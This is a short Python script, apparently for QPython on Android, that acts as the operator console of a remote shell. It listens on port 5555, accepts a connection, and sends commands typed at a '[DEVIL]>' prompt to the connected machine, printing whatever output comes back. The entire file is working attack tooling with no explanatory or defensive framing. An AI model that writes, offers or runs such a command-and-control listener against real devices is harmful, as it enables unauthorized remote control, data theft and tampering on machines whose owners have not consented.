#!/usr/bin/python
#/data/user/0/org.qpython.qpy3/files/bin/qpython3-android5.sh
#-*-coding:utf8;-*-
#qpy:console

import socket
import sys
import os

os.system("clear")

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

global host
global port

host = ""
port = 5555
try:
    s.bind((host,port))

    print("[#] waiting for the connection....")
    s.listen(5)

    (conn,addr) = s.accept()
    print("[#] Clint address = ",addr)
except Exception as e:
    print("[!][!] ",e)
    exit()

while True:
    com = input("[ip={}:port={}][DEVIL]> ".format(addr[0],addr[1]))
    if com == "" or com == (" " * len(com)):
        com = "echo '[!][!] cannot execute empty commands :p'"
    conn.send(str.encode(com))
    if com == "exit" or com == "quite":
        break
    m = str(conn.recv(999999999),"utf-8")
    print(m)

conn.close()
s.close()